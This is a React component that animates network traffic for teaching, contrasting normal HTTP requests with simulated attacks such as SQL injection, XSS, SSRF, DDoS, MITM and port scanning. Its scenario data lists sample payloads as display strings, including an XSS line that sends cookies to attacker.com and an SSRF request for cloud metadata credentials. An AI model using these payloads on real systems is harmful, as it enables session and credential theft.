import React, { useState, useEffect } from 'react';
import { AlertTriangle, XCircle, Shield, Globe, Zap, Ghost, Lock, Search, Eye } from 'lucide-react';
import { Button } from '@/components/ui/button';

interface Packet {
    id: number;
    type: string;
    direction: 'request' | 'response' | 'intercept';
    payload: string;
    status: string;
    isMalicious: boolean;
}

interface Scenario {
    name: string;
    category: 'Web (OWASP)' | 'Network' | 'Normal';
    color: string;
    icon: React.ElementType;
    packets: { payload: string; status: string; type: string; isMalicious: boolean }[];
}

const packetScenarios: Record<string, Scenario> = {
    normal: {
        name: "Normal HTTP Traffic",
        category: "Normal",
        color: "#10b981",
        icon: Globe,
        packets: [
            { payload: "GET /index.html HTTP/1.1", status: "200 OK", type: "normal", isMalicious: false },
            { payload: "GET /style.css HTTP/1.1", status: "200 OK", type: "normal", isMalicious: false },
            { payload: "GET /api/v1/user/active HTTP/1.1", status: "200 OK", type: "normal", isMalicious: false }
        ]
    },
    sqli: {
        name: "A03:2021-Injection (SQLi)",
        category: "Web (OWASP)",
        color: "#ef4444",
        icon: XCircle,
        packets: [
            { payload: "POST /login ' OR 1=1--", status: "500 Internal Error", type: "injection", isMalicious: true },
            { payload: "GET /user?id=1 UNION SELECT password FROM users", status: "200 OK (Data Leaked!)", type: "injection", isMalicious: true },
            { payload: "POST /search ' WAITFOR DELAY '0:0:10'--", status: "Latency Spike", type: "injection", isMalicious: true }
        ]
    },
    xss: {
        name: "A03:2021-Injection (XSS)",
        category: "Web (OWASP)",
        color: "#f59e0b",
        icon: AlertTriangle,
        packets: [
            { payload: "<script>fetch('http://attacker.com?c='+document.cookie)</script>", status: "Script Executed", type: "xss", isMalicious: true },
            { payload: "<img src=x onerror=alert(1)>", status: "Reflected XSS", type: "xss", isMalicious: true }
        ]
    },
    auth: {
        name: "A07:2021-Broken Auth",
        category: "Web (OWASP)",
        color: "#8b5cf6",
        icon: Lock,
        packets: [
            { payload: "POST /login user:admin pass:password123", status: "401 Unauthorized", type: "auth", isMalicious: true },
            { payload: "POST /login user:admin pass:admin123", status: "200 Success (Hijacked!)", type: "auth", isMalicious: true }
        ]
    },
    ssrf: {
        name: "A10:2021-SSRF",
        category: "Web (OWASP)",
        color: "#fbbf24",
        icon: Eye,
        packets: [
            { payload: "GET /view?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", status: "AWS Creds Leaked", type: "ssrf", isMalicious: true },
            { payload: "GET /proxy?url=http://localhost:22", status: "Internal Port Found", type: "ssrf", isMalicious: true }
        ]
    },
    ddos: {
        name: "L4/L7 DDoS Flood",
        category: "Network",
        color: "#dc2626",
        icon: Zap,
        packets: Array(10).fill(null).map((_, i) => ({
            payload: i % 2 === 0 ? `SYN Flood Source:${100 + i}.2.3.4` : "GET / HTTP/1.1 (Slowloris)",
            status: "Service Saturating...",
            type: "ddos",
            isMalicious: true
        }))
    },
    mitm: {
        name: "Man-in-the-Middle (MITM)",
        category: "Network",
        color: "#f472b6",
        icon: Ghost,
        packets: [
            { payload: "HTTP POST /bank/transfer amount=1000", status: "Intercepted by Attacker", type: "mitm", isMalicious: true },
            { payload: "MODIFIED POST amount=99999", status: "Forwarded to Server", type: "mitm", isMalicious: true }
        ]
    },
    recon: {
        name: "Advanced Recon / Scan",
        category: "Network",
        color: "#06b6d4",
        icon: Search,
        packets: [
            { payload: "nmap -sS -p 1-65535 silent_scan", status: "Scanning TCP Ports", type: "recon", isMalicious: true },
            { payload: "Banner Grabbing: Apache 2.4.49", status: "Service Identified", type: "recon", isMalicious: true }
        ]
    }
};

const PacketFlowAnimation: React.FC = () => {
    const [selectedScenario, setSelectedScenario] = useState<string>('normal');
    const [activeCategory, setActiveCategory] = useState<'Normal' | 'Web (OWASP)' | 'Network'>('Normal');
    const [activePackets, setActivePackets] = useState<Packet[]>([]);
    const [isAnimating, setIsAnimating] = useState(false);
    const [packetCounter, setPacketCounter] = useState(0);

    const scenario = packetScenarios[selectedScenario];
    const CATEGORIES = ['Normal', 'Web (OWASP)', 'Network'] as const;

    useEffect(() => {
        if (!isAnimating) return;

        const interval = setInterval(() => {
            const scenarioPackets = scenario.packets;
            const currentIndex = packetCounter % scenarioPackets.length;
            const packetData = scenarioPackets[currentIndex];

            const newPacket: Packet = {
                id: Date.now() + Math.random(),
                type: packetData.type,
                // In MITM: Even request -> Client to Attacker, Odd request -> Attacker to Server
                direction: selectedScenario === 'mitm'
                    ? (currentIndex % 2 === 0 ? 'request' : 'intercept')
                    : (currentIndex % 2 === 0 ? 'request' : 'response'),
                payload: packetData.payload,
                status: packetData.status,
                isMalicious: packetData.isMalicious
            };

            setActivePackets(prev => [...prev, newPacket]);
            setPacketCounter(prev => prev + 1);

            // Clean up packet after animation
            setTimeout(() => {
                setActivePackets(prev => prev.filter(p => p.id !== newPacket.id));
            }, selectedScenario === 'ddos' ? 1500 : 3500);

        }, selectedScenario === 'ddos' ? 200 : 2000);

        return () => clearInterval(interval);
    }, [isAnimating, packetCounter, scenario, selectedScenario]);

    const handleScenarioChange = (key: string) => {
        setSelectedScenario(key);
        setActivePackets([]);
        setPacketCounter(0);
        setIsAnimating(false);
    };

    return (
        <div className="w-full max-w-6xl mx-auto space-y-8 p-4">
            {/* Category and Scenario Selector */}
            <div className="space-y-4">
                <div className="flex gap-2 border-b border-border pb-4 overflow-x-auto">
                    {CATEGORIES.map((cat) => (
                        <button
                            key={cat}
                            onClick={() => setActiveCategory(cat)}
                            className={`px-4 py-2 rounded-lg text-sm font-bold tracking-tight transition-all whitespace-nowrap ${activeCategory === cat
                                ? 'bg-primary text-primary-foreground shadow-lg'
                                : 'bg-secondary text-muted-foreground hover:bg-secondary/80'
                                }`}
                        >
                            {cat}
                        </button>
                    ))}
                </div>

                <div className="flex gap-2 flex-wrap min-h-[50px]">
                    {Object.entries(packetScenarios)
                        .filter(([_, val]) => val.category === activeCategory)
                        .map(([key, value]) => {
                            const Icon = value.icon;
                            return (
                                <button
                                    key={key}
                                    onClick={() => handleScenarioChange(key)}
                                    className={`px-4 py-2 rounded-lg text-xs font-semibold border transition-all flex items-center gap-2 ${selectedScenario === key
                                        ? 'bg-primary/20 border-primary text-primary shadow-[0_0_15px_rgba(var(--primary),0.2)]'
                                        : 'bg-background border-border text-muted-foreground hover:bg-muted/50 hover:border-foreground/20'
                                        }`}
                                >
                                    <Icon className="h-3.5 w-3.5" />
                                    {value.name}
                                </button>
                            );
                        })}
                </div>
            </div>

            {/* Animation Controls */}
            <div className="flex justify-center gap-4">
                <Button
                    size="lg"
                    onClick={() => setIsAnimating(!isAnimating)}
                    className={isAnimating ? "bg-red-500 hover:bg-red-600" : "bg-green-600 hover:bg-green-700"}
                >
                    {isAnimating ? <Zap className="mr-2 h-4 w-4 animate-pulse" /> : <Shield className="mr-2 h-4 w-4" />}
                    {isAnimating ? 'STOP SIMULATION' : 'START SIMULATION'}
                </Button>
            </div>

            {/* Visualization Canvas */}
            <div className="relative h-[400px] border border-border rounded-2xl bg-background/50 dark:bg-black/40 backdrop-blur-xl overflow-hidden group">
                <div className="absolute inset-0 bg-grid-pattern opacity-5" />

                {/* Nodes Container */}
                <div className="absolute inset-0 flex items-center justify-between px-[10%] z-20 pointer-events-none">
                    {/* Endpoint A (Client) */}
                    <div className="relative flex flex-col items-center">
                        <div className="w-20 md:w-24 h-20 md:h-24 rounded-2xl bg-blue-500/10 border-2 border-blue-500/50 flex flex-col items-center justify-center shadow-[0_0_30px_rgba(59,130,246,0.2)]">
                            <Globe className="h-8 w-8 text-blue-500 mb-1" />
                            <span className="text-[10px] font-black tracking-tighter text-blue-400">CLIENT</span>
                        </div>
                    </div>

                    {/* MITM Node (Interceptor) - Only visible in MITM mode */}
                    {selectedScenario === 'mitm' && (
                        <div className="relative flex flex-col items-center animate-fade-in">
                            <div className="w-20 md:w-24 h-20 md:h-24 rounded-2xl bg-red-500/10 border-2 border-red-500/50 flex flex-col items-center justify-center shadow-[0_0_30px_rgba(239,68,68,0.3)]">
                                <Ghost className="h-8 w-8 text-red-500 mb-1 animate-bounce" />
                                <span className="text-[10px] font-black tracking-tighter text-red-400">ATTACKER</span>
                            </div>
                            <p className="absolute -bottom-6 text-[8px] font-mono text-red-500 font-bold uppercase whitespace-nowrap">Man-in-the-Middle</p>
                        </div>
                    )}

                    {/* Endpoint B (Server) */}
                    <div className="relative flex flex-col items-center">
                        <div className="w-20 md:w-24 h-20 md:h-24 rounded-2xl bg-green-500/10 border-2 border-green-500/50 flex flex-col items-center justify-center shadow-[0_0_30px_rgba(34,197,94,0.2)]">
                            <Lock className="h-8 w-8 text-green-500 mb-1" />
                            <span className="text-[10px] font-black tracking-tighter text-green-400">SERVER</span>
                        </div>
                    </div>
                </div>

                {/* Connection Lines */}
                <div className="absolute top-1/2 left-[15%] right-[15%] h-px bg-gradient-to-r from-blue-500/20 via-white/5 to-green-500/20" />

                {/* Flying Packets */}
                <div className="relative h-full w-full pointer-events-none">
                    {activePackets.map((packet) => (
                        <div
                            key={packet.id}
                            className="absolute top-1/2 -translate-y-1/2 z-30"
                            style={{
                                animationName: selectedScenario === 'mitm'
                                    ? (packet.direction === 'request'
                                        ? 'packet-client-to-attacker' // Client -> Attacker
                                        : (packet.direction === 'intercept' ? 'packet-attacker-to-server' : 'none')) // Attacker -> Server
                                    : (packet.direction === 'request'
                                        ? 'packet-client-to-server' // Client -> Server
                                        : 'packet-server-to-client'), // Server -> Client
                                animationDuration: selectedScenario === 'ddos' ? '1s' : '2s',
                                animationTimingFunction: 'linear',
                                animationFillMode: 'forwards',
                            }}
                        >
                            <div
                                className={`px-4 py-2.5 rounded-xl text-[10px] font-mono whitespace-nowrap shadow-2xl border ${packet.isMalicious ? 'bg-red-500/20 border-red-500/50' : 'bg-green-500/20 border-green-500/50'
                                    }`}
                                style={{
                                    boxShadow: `0 0 25px ${packet.isMalicious ? 'rgba(239, 68, 68, 0.4)' : 'rgba(34, 197, 94, 0.2)'}`
                                }}
                            >
                                <div className={`font-black flex items-center gap-1.5 ${packet.isMalicious ? 'text-red-400' : 'text-green-400'}`}>
                                    {packet.isMalicious && <AlertTriangle className="h-3 w-3" />}
                                    {packet.payload}
                                </div>
                                <div className="text-muted-foreground text-[9px] mt-1 font-bold">
                                    STATUS: {packet.status}
                                </div>
                            </div>
                        </div>
                    ))}
                </div>
            </div>

            <style>{`
                .bg-grid-pattern {
                    background-image: radial-gradient(circle, #fff 1px, transparent 1px);
                    background-size: 30px 30px;
                }

                /* Standard Flow: Client (10%) <-> Server (90%) */
                @keyframes packet-client-to-server {
                    from { left: 15%; opacity: 0; transform: scale(0.8); }
                    10% { opacity: 1; transform: scale(1); }
                    90% { opacity: 1; transform: scale(1); }
                    to { left: 85%; opacity: 0; transform: scale(0.8); }
                }

                @keyframes packet-server-to-client {
                    from { left: 85%; opacity: 0; transform: scale(0.8); }
                    10% { opacity: 1; transform: scale(1); }
                    90% { opacity: 1; transform: scale(1); }
                    to { left: 15%; opacity: 0; transform: scale(0.8); }
                }

                /* MITM Flow: Client (10%) -> Attacker (50%) -> Server (90%) */
                @keyframes packet-client-to-attacker {
                    from { left: 15%; opacity: 0; }
                    10% { opacity: 1; }
                    90% { opacity: 1; }
                    to { left: 50%; opacity: 0; }
                }

                @keyframes packet-attacker-to-server {
                    from { left: 50%; opacity: 0; }
                    10% { opacity: 1; }
                    90% { opacity: 1; }
                    to { left: 85%; opacity: 0; }
                }

                .animate-fade-in {
                    animation: fadeIn 0.5s ease-out forwards;
                }

                @keyframes fadeIn {
                    from { opacity: 0; transform: translateY(10px); }
                    to { opacity: 1; transform: translateY(0); }
                }
            `}</style>
        </div>
    );
};

export default PacketFlowAnimation;
